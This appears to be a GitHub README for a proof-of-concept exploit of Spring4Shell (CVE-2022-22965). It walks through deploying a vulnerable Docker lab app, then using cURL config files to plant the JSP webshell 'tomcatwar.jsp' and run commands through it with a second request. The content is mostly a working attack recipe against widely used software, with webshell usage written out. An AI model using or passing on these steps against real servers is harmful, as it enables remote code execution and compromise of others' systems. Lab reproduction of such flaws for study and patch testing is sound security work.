# Spring4Shell-cURL
Weaponizing cURL configs to exploit Spring4Shell (CVE-2022-22965)


## cURL? Really?
Yup. I hadn't seen this method posted anywhere, so just wanted to document. Most of the heavy lifting had already been done, I just put my own twist on things. 


### Quick Setup

1. Clone the repo. You'll need Docker and cURL.

2. Deploy the Docker container:  

```
docker image build -t retro/stupidrumor . && docker container run -it --publish 8080:8080 retro/stupidrumor
```

3. Use cURL to upload your WAR. The following command will read from the local `requests.txt` file. It contains request configurations we want cURL to use, namely the specific headers we need to prime the application for exploitation. You'll notice the last line `data-binary = "@body.txt"` too, which is the local file containing our POST body:

```
curl --config request.txt http://localhost:8080/stupidRumor_war/index
``` 
   
**Note:** I've included proxy support within the cURL configs, so we can send our requests through a transparent application proxy (Burp). This happens over port 8081, so make sure to adjust accordingly. This is mostly for troubleshooting, but handy to have in your Repeater nonetheless :)
   
4. Once the cURL command is sent, the webshell `tomcatwar.jsp` will be uploaded to the webroot at `stupidRumor_war/`. If you want, you can access the shell in a browser.

5. But we're using cURL, so issue the second request to run your commands:  

```
curl 'http://localhost:8080/stupidRumor_war/tomcatwar.jsp?pwd=j&cmd=whoami' --output -
``` 

## In Action
   
![image](https://user-images.githubusercontent.com/13237617/161151879-3cf326ad-6610-4bfe-992d-1d03279e6da5.png)

   
   
   
   
   
   
   
   
   
   
   
   ----------------
   Refs:  
[https://github.com/Retrospected/spring-rce-poc/blob/master/deploy.sh](https://github.com/Retrospected/spring-rce-poc/blob/master/deploy.sh)
